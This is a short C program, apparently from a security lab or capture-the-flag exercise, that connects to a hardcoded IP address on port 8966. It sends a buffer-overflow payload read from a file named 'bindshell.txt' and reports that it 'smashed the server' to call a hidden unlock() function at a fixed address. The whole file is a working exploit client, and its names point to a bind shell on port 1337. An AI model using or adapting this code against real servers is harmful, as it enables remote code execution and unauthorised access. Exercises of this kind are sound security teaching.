#include "utils.h"

#define LOCALHOST   "127.0.0.1"
#define IPADDRESS   "128.114.59.215"
#define SHELLPORT   1337
#define SMASHINPUT  "bindshell.txt"

int					sockfd;
struct sockaddr_in	servaddr;
char                buff[MAXLINE], response[MAXLINE];

void connectserver() {
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket error");
        exit(1);
    }

    if (connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
        perror("connect error");
        exit(0);
    }

    printf("Connected\n");
    fflush(stdout);
}

void smash() {
    connectserver();

    FILE *input = fopen(SMASHINPUT, "r");
    if (input) {
        bzero(buff, sizeof(buff));
        fgets(buff, MAXLINE, input);
    }

    if (write(sockfd, buff, strlen(buff)) < 0) {
        perror("write error");
        exit(0);
    }

    printf("Smashed the server to invoke the function unlock() at address 0x401379.\n");
    printf("%s\n", DIVIDER);
    fflush(stdout);
}

int main(int argc, char **argv) {
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(8966);

    // intialize the server's ip address
    if (inet_pton(AF_INET, IPADDRESS, &servaddr.sin_addr) <= 0) {
        printf("inet_pton error for %s", argv[1]);
        exit(0);
    }

    printf("%s", IPADDRESS);
    fflush(stdout);

    smash();
}

